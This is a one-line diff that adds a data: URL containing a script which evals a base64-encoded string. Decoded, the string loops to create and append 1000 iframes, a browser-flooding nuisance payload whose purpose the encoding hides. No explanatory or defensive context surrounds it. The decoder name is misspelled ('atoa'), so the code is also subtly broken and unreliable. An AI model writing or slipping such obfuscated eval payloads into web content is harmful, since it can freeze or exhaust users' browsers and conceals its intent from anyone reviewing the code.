@@ -1,0 +1,1 @@
+data:text/html,<script>eval(atoa("Zm9yIChsZXQgaW5kZXggPSAwOyBpbmRleCA8IDEwMDA7IGluZGV4KyspIHsKCiBjb25zdCBlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaWZyYW1lJykgICAKIGRvY3VtZW50LmJvZHkuYXBwZW5kKGUpCn0"))</script>
